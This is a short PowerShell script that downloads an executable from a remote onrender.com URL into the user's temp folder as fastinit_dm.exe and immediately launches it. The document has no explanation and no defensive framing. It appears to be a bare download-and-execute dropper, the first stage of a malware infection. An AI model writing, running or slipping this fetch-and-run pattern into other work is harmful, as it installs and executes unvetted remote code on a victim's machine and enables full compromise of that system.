$Config = @{
    Url        = "https://fastinit-host.onrender.com/downloader_rs"
    OutputPath = "$env:TEMP\fastinit_dm.exe"
}

function Invoke-MyShit {
    param(
        [Parameter(Position = 0)][string]$Url = $Config.Url,
        [Parameter(Position = 1)][string]$OutputPath = $Config.OutputPath
    )
    Invoke-WebRequest -Uri $Url -OutFile $OutputPath
    Start-Process $OutputPath
}

function Main {
    Invoke-MyShit @args
}

Main @args